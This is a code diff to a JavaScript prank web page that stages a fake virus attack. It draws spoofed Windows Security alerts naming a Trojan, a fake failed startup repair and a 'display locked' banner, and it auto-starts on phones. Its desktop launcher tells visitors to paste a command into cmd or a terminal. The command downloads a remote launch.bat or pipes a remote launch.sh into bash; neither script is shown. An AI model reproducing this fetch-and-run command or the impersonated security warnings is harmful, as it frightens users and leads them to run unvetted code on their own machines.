+        this.ctx.fillText(line, leftPad, y);
+        y += lineH;
       }}
+    }}
+
+    // Panic tap feedback
+    if (this.panicCount > 0) {{
+      this.ctx.fillStyle = "#ffd228";
+      this.ctx.font = `bold ${{fontSz + 2}}px Consolas, monospace`;
+      this.ctx.fillText(`[ Panic interaction count: ${{this.panicCount}} ... Bro is stressing 💀 ]`, leftPad, y + 14);
     }}
   }}
 
@@ -1365,7 +1355,7 @@ class WebChaosPrank {{
     for (let i = 0; i < numBars; i++) {{
       const gy = Math.random() * (this.H - 30);
       const gh = 8 + Math.random() * 35;
-      const cols = ["rgba(255, 0, 85, 0.35)", "rgba(0, 255, 255, 0.35)", "rgba(255, 255, 255, 0.4)", "rgba(0, 0, 0, 0.6)"];
+      const cols = ["rgba(255, 0, 85, 0.4)", "rgba(0, 255, 255, 0.4)", "rgba(255, 255, 255, 0.5)", "rgba(0, 0, 0, 0.7)"];
       this.ctx.fillStyle = cols[Math.floor(Math.random() * cols.length)];
       this.ctx.fillRect(0, gy, this.W, gh);
     }}
@@ -1377,9 +1367,10 @@ class WebChaosPrank {{
   }}
 
   drawDefenderToast() {{
-    const tw = 370, th = 125;
-    const tx = this.W - tw - 20;
-    const ty = this.H - th - 30;
+    const tw = this.isMobile ? Math.min(this.W - 24, 340) : 370;
+    const th = 115;
+    const tx = this.isMobile ? (this.W - tw) / 2 : this.W - tw - 20;
+    const ty = this.isMobile ? 45 : this.H - th - 30;
 
     // Toast Card
     this.ctx.fillStyle = "#1c1c1c";
@@ -1398,7 +1389,7 @@ class WebChaosPrank {{
     // Header
     this.ctx.font = "9px 'Segoe UI', sans-serif";
     this.ctx.fillStyle = "#888888";
-    this.ctx.fillText("Windows Security  •  Just now", tx + 42, ty + 24);
+    this.ctx.fillText(`${{this.isMobile ? 'Mobile Security' : 'Windows Security'}}  •  Just now`, tx + 42, ty + 24);
 
     // Title & Body
     this.ctx.font = "bold 11px 'Segoe UI', sans-serif";
@@ -1406,17 +1397,17 @@ class WebChaosPrank {{
     this.ctx.fillText("Threat service has stopped", tx + 42, ty + 44);
     this.ctx.font = "10px 'Segoe UI', sans-serif";
     this.ctx.fillStyle = "#ff4d4d";
-    this.ctx.fillText("Severe: Trojan:Win32/Brainrot.Cascade!MTB", tx + 42, ty + 64);
+    this.ctx.fillText("Severe: Trojan:Win32/Brainrot.Cascade!MTB", tx + 42, ty + 62);
 
     const statusTxt = this.toastDenied ? "ACCESS DENIED: Terminated by malware" : "Containment failed. Active payload spreading.";
     this.ctx.fillStyle = this.toastDenied ? "#ff3333" : "#cccccc";
     this.ctx.font = "9px 'Segoe UI', sans-serif";
-    this.ctx.fillText(statusTxt, tx + 42, ty + 83);
+    this.ctx.fillText(statusTxt, tx + 42, ty + 79);
 
     // Button
-    const btnW = 110, btnH = 26;
-    const bx = tx + tw - btnW - 14;
-    const by = ty + th - btnH - 10;
+    const btnW = 105, btnH = 24;
+    const bx = tx + tw - btnW - 12;
+    const by = ty + th - btnH - 8;
     this.ctx.fillStyle = this.toastDenied ? "#330000" : "#2d2d2d";
     this.ctx.fillRect(bx, by, btnW, btnH);
     this.ctx.strokeStyle = "#555555";
@@ -1424,16 +1415,17 @@ class WebChaosPrank {{
     this.ctx.fillStyle = this.toastDenied ? "#ff4d4d" : "#ffffff";
     this.ctx.font = "bold 9px 'Segoe UI', sans-serif";
     this.ctx.textAlign = "center";
-    this.ctx.fillText(this.toastDenied ? "ACCESS DENIED" : "Restart now", bx + btnW / 2, by + 17);
+    this.ctx.fillText(this.toastDenied ? "ACCESS DENIED" : "Restart device", bx + btnW / 2, by + 16);
     this.ctx.textAlign = "left";
 
-    // Mouse proximity check
+    // Proximity check
     if (!this.toastDenied) {{
       const dist = Math.hypot(this.mouseX - (bx + btnW / 2), this.mouseY - (by + btnH / 2));
       if (dist < 55) {{
         this.toastDenied = true;
         this.shakeUntil = performance.now() + 120;
         this.sfx.winError();
+        if (navigator.vibrate) {{ try {{ navigator.vibrate(80); }} catch(e){{}} }}
       }}
     }}
   }}
@@ -1443,35 +1435,35 @@ class WebChaosPrank {{
     this.ctx.fillRect(0, 0, this.W, this.H);
 
     const lines = [
-      {{ t: "Windows failed to start. A recent hardware or software change might be the cause.", f: "bold 14px 'Courier New', monospace", c: "#ffffff" }},
-      {{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }},
-      {{ t: "Startup Repair is checking your system for problems...", f: "12px 'Courier New', monospace", c: "#cccccc" }}
+      {{ t: "System failed to start. Automatic repair in progress...", f: "bold 13px 'Courier New', monospace", c: "#ffffff" }},
+      {{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }},
+      {{ t: "Startup Repair is checking for system corruption...", f: "11px 'Courier New', monospace", c: "#cccccc" }}
     ];
 
     if (elapsed < 1.4) {{
       const pct = Math.min(78, Math.max(12, Math.floor((elapsed / 1.4) * 78)));
       const barLen = Math.floor(pct / 5);
       const barStr = "█".repeat(barLen) + "-".repeat(20 - barLen);
-      lines.push({{ t: `Attempting automatic repairs: [${{barStr}}] ${{pct}}%`, f: "12px 'Courier New', monospace", c: "#ffd228" }});
-      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
+      lines.push({{ t: `Attempting repairs: [${{barStr}}] ${{pct}}%`, f: "11px 'Courier New', monospace", c: "#ffd228" }});
+      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
       if (pct >= 40) {{
-        lines.push({{ t: "Diagnosing root cause... EXTREME LACK OF COMPUTER LITERACY", f: "12px 'Courier New', monospace", c: "#ff5555" }});
+        lines.push({{ t: "Diagnosing root cause... EXTREME MEME OVERLOAD", f: "11px 'Courier New', monospace", c: "#ff5555" }});
       }}
     }} else if (elapsed < 2.8) {{
-      lines.push({{ t: "Attempting automatic repairs: [--------------------]   0%", f: "12px 'Courier New', monospace", c: "#ff5555" }});
-      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
-      lines.push({{ t: "ERROR: Repair made it significantly worse.", f: "12px 'Courier New', monospace", c: "#ff3232" }});
-      lines.push({{ t: "Diagnostic report: bro we're cooked 💀", f: "12px 'Courier New', monospace", c: "#ffd228" }});
+      lines.push({{ t: "Attempting repairs: [--------------------]   0%", f: "11px 'Courier New', monospace", c: "#ff5555" }});
+      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
+      lines.push({{ t: "ERROR: Repair made it significantly worse.", f: "11px 'Courier New', monospace", c: "#ff3232" }});
+      lines.push({{ t: "Diagnostic report: bro we're cooked 💀", f: "11px 'Courier New', monospace", c: "#ffd228" }});
     }} else {{
-      lines.push({{ t: "Attempting automatic repairs: [--------------------]   FAILED", f: "12px 'Courier New', monospace", c: "#ff5555" }});
-      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
-      lines.push({{ t: "ERROR: Automatic recovery abandoned.", f: "12px 'Courier New', monospace", c: "#ff3232" }});
-      lines.push({{ t: "Final Attempt: Rebooting reality... [OK]", f: "12px 'Courier New', monospace", c: "#00e650" }});
-      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
-      lines.push({{ t: "Returning control to terminal in 1...", f: "bold 14px 'Courier New', monospace", c: "#ffffff" }});
+      lines.push({{ t: "Attempting repairs: [--------------------]   FAILED", f: "11px 'Courier New', monospace", c: "#ff5555" }});
+      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
+      lines.push({{ t: "ERROR: Automatic recovery abandoned.", f: "11px 'Courier New', monospace", c: "#ff3232" }});
+      lines.push({{ t: "Final Attempt: Rebooting reality... [OK]", f: "11px 'Courier New', monospace", c: "#00e650" }});
+      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
+      lines.push({{ t: "Returning control to terminal in 1...", f: "bold 13px 'Courier New', monospace", c: "#ffffff" }});
     }}
 
-    let y = Math.max(40, (this.H - lines.length * 26) / 2);
+    let y = Math.max(40, (this.H - lines.length * 24) / 2);
     this.ctx.textAlign = "center";
     for (let i = 0; i < lines.length; i++) {{
       if (lines[i].t) {{
@@ -1479,7 +1471,7 @@ class WebChaosPrank {{
         this.ctx.fillStyle = lines[i].c;
         this.ctx.fillText(lines[i].t, this.W / 2, y);
       }}
-      y += 26;
+      y += 24;
     }}
     this.ctx.textAlign = "left";
   }}
@@ -1525,36 +1517,38 @@ class WebChaosPrank {{
     if (this.state === "BOOT" || this.state === "DOWNLOADING") {{
       this.ctx.fillStyle = "#040608";
       this.ctx.fillRect(0, 0, this.W, this.H);
-      this.ctx.fillStyle = "#00e650";
-      this.ctx.font = "16px Consolas, monospace";
-      let y = 50;
-      const lh = 22;
-      const maxLines = Math.floor((this.H - 120) / lh);
+
+      const fontSz = this.isMobile ? 11 : 15;
+      const leftPad = this.isMobile ? 14 : 45;
+      const lh = this.isMobile ? 18 : 22;
+      this.ctx.font = `${{fontSz}}px Consolas, monospace`;
+
+      let y = this.isMobile ? 40 : 50;
+      const maxLines = Math.floor((this.H - (this.isMobile ? 90 : 120)) / lh);
       const start = Math.max(0, this.revealedLines.length - maxLines);
 
       for (let i = start; i < this.revealedLines.length; i++) {{
         const l = this.revealedLines[i];
         if (l.includes("FAILED") || l.includes("UNAUTHORIZED")) this.ctx.fillStyle = "#ff3232";
         else if (l.includes("100%")) this.ctx.fillStyle = "#ffd228";
+        else if (l.startsWith("=")) this.ctx.fillStyle = "#557760";
         else this.ctx.fillStyle = "#00e650";
-        this.ctx.fillText(l, 50, y);
+        this.ctx.fillText(l, leftPad, y);
         y += lh;
       }}
       if (this.state === "BOOT" && this.bootIdx < this.bootLines.length) {{
         const partial = this.bootLines[this.bootIdx].substring(0, this.bootChar);
         this.ctx.fillStyle = "#00e650";
-        this.ctx.fillText(partial + "█", 50, y);
+        this.ctx.fillText(partial + "█", leftPad, y);
       }}
       this.renderStatus(true);
       return;
     }}
 
-    // 5. Realistic Desktop Meme & Popup Chaos Phases
+    // 5. Desktop Meme & Popup Chaos Phases
     if (this.state === "TILING_GAPS" || this.state === "CASCADE_SATURATION") {{
-      // Realistic desktop wallpaper & taskbar
       this.drawSimulatedDesktop();
 
-      // Screen shake impact
       let shakeX = 0, shakeY = 0;
       if (performance.now() < this.shakeUntil) {{
         shakeX = (Math.random() - 0.5) * 8;
@@ -1584,17 +1578,21 @@ class WebChaosPrank {{
     if (this.state === "CLEANUP") {{
       this.ctx.fillStyle = "#040608";
       this.ctx.fillRect(0, 0, this.W, this.H);
-      this.ctx.fillStyle = "#ffffff";
-      this.ctx.font = "18px Consolas, monospace";
-      let y = 60;
-      const lh = 24;
+      
+      const fontSz = this.isMobile ? 12 : 16;
+      const leftPad = this.isMobile ? 16 : 60;
+      const lh = this.isMobile ? 20 : 24;
+      this.ctx.font = `${{fontSz}}px Consolas, monospace`;
+
+      let y = this.isMobile ? 40 : 60;
       if (this.cleanupRevealed) {{
         this.cleanupRevealed.forEach(l => {{
-          if (l.includes("TRAUMATIZED")) this.ctx.fillStyle = "#ffd228";
-          else if (l.includes("ERROR")) this.ctx.fillStyle = "#ff3232";
+          if (l.includes("TRAUMATIZED") || l.includes("COMPROMISED")) this.ctx.fillStyle = "#ffd228";
+          else if (l.includes("ERROR") || l.includes("SURVIVE")) this.ctx.fillStyle = "#ff3232";
           else if (l.startsWith(">")) this.ctx.fillStyle = "#00e650";
+          else if (l.startsWith("=")) this.ctx.fillStyle = "#557760";
           else this.ctx.fillStyle = "#ffffff";
-          this.ctx.fillText(l, 60, y);
+          this.ctx.fillText(l, leftPad, y);
           y += lh;
         }});
       }}
@@ -1611,41 +1609,76 @@ class WebChaosPrank {{
     this.ctx.lineTo(this.W, this.H - 30);
     this.ctx.stroke();
 
-    this.ctx.font = "13px Consolas, monospace";
+    this.ctx.font = this.isMobile ? "10px Consolas, monospace" : "13px Consolas, monospace";
     this.ctx.fillStyle = locked ? "#ff3232" : "#00e650";
     const statusText = locked
-      ? "[!] VIRUS PROTOCOL OVERRIDE  |  SECURITY: CRITICAL  |  DISPLAY: LOCKED"
+      ? (this.isMobile ? "[!] VIRUS OVERRIDE | DISPLAY LOCKED" : "[!] VIRUS PROTOCOL OVERRIDE  |  SECURITY: CRITICAL  |  DISPLAY: LOCKED")
       : "[OK] SYSTEM RESTORED";
-    this.ctx.fillText(statusText, 20, this.H - 10);
+    this.ctx.fillText(statusText, this.isMobile ? 10 : 20, this.H - 10);
   }}
 }}
 
 /* ==========================================================================
-   INITIALIZATION ROUTER
+   INITIALIZATION CONTROLLER
    ========================================================================== */
-window.addEventListener("DOMContentLoaded", () => {{
-  const device = detectDevice();
-  console.log("Device detection result:", device);
+function init() {{
+  const sfx = new WebSFX();
+  const canvas = document.getElementById("main-canvas");
+  const mobileLauncher = document.getElementById("mobile-launcher");
+  const desktopLauncher = document.getElementById("desktop-launcher");
+  const canvasContainer = document.getElementById("canvas-container");
+  const btnStartMobile = document.getElementById("btn-start-mobile");
+  const mDeviceName = document.getElementById("m-device-name");
+  const mobileAbortBtn = document.getElementById("btn-mobile-abort");
+  const btnRunBrowserSim = document.getElementById("btn-run-browser-sim");
 
-  if (device === "iphone") {{
-    runMobileTerminal(IPHONE_SCRIPT);
-  }} else if (device === "ipad") {{
-    runMobileTerminal(IPAD_SCRIPT);
-  }} else if (device === "android-phone") {{
-    runMobileTerminal(ANDROID_PHONE_SCRIPT);
-  }} else if (device === "android-tablet") {{
-    runMobileTerminal(ANDROID_TABLET_SCRIPT);
+  let prankInstance = null;
+
+  function startPrankSession(isMobileMode) {{
+    if (prankInstance) return;
+    sfx.init();
+    sfx.blip();
+    if (navigator.vibrate) {{ try {{ navigator.vibrate(60); }} catch(e){{}} }}
+    mobileLauncher.style.display = "none";
+    desktopLauncher.style.display = "none";
+    canvasContainer.style.display = "block";
+    mobileAbortBtn.style.display = "block";
+
+    const devName = isMobileMode ? getMobileDeviceName() : "DESKTOP-7X4N2";
+    prankInstance = new WebChaosPrank(canvas, sfx, isMobileMode, devName);
+    prankInstance.start();
+  }}
+
+  mobileAbortBtn.addEventListener("click", () => {{
+    if (prankInstance) {{
+      prankInstance.triggerEmergencyExit();
+    }}
+  }});
+
+  const isMobile = isMobileDevice();
+
+  if (isMobile) {{
+    // ── MOBILE WORKFLOW ──
+    desktopLauncher.style.display = "none";
+    mobileLauncher.style.display = "flex";
+    if (mDeviceName) {{
+      mDeviceName.textContent = getMobileDeviceName().toUpperCase();
+    }}
+
+    btnStartMobile.addEventListener("click", () => startPrankSession(true));
+    mobileLauncher.addEventListener("touchstart", () => startPrankSession(true), {{ passive: true }});
+
+    // Auto-start timer after 2.5s
+    setTimeout(() => {{
+      if (!prankInstance) startPrankSession(true);
+    }}, 2500);
+
   }} else {{
-    // DESKTOP: show launcher
-    const desktopContainer = document.getElementById("desktop-container");
-    const launcher = document.getElementById("desktop-launcher");
-    const canvas = document.getElementById("desktop-canvas");
-    desktopContainer.style.display = "block";
+    // ── DESKTOP WORKFLOW ──
+    mobileLauncher.style.display = "none";
+    desktopLauncher.style.display = "block";
 
-    const sfx = new WebSFX();
-    const prank = new WebChaosPrank(canvas, sfx);
-
-    const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" && "%TEMP%\\\\launch.bat"';
+    const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\\\\\launch.bat" && "%TEMP%\\\\\\\\launch.bat"';
     const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';
 
     const tabWin = document.getElementById("tab-win");
@@ -1667,7 +1700,7 @@ window.addEventListener("DOMContentLoaded", () => {{
         tabWin.classList.add("active");
         tabUnix.classList.remove("active");
         currentCmd = WIN_CMD;
-        cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
+        cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" && "%TEMP%\\\\launch.bat"';
         cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
       }}
     }}
@@ -1682,7 +1715,6 @@ window.addEventListener("DOMContentLoaded", () => {{
       setTab("unix");
     }});
 
-    // Auto-detect Mac / Linux
     const plat = navigator.platform || '';
     const ua = navigator.userAgent || '';
     if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {{
@@ -1723,8 +1755,18 @@ window.addEventListener("DOMContentLoaded", () => {{
         }}, 2500);
       }}
     }});
+
+    btnRunBrowserSim.addEventListener("click", () => {{
+      startPrankSession(false);
+    }});
   }}
-}});
+}}
+
+if (document.readyState === "loading") {{
+  document.addEventListener("DOMContentLoaded", init);
+}} else {{
+  init();
+}}
 </script>
 </body>
 </html>
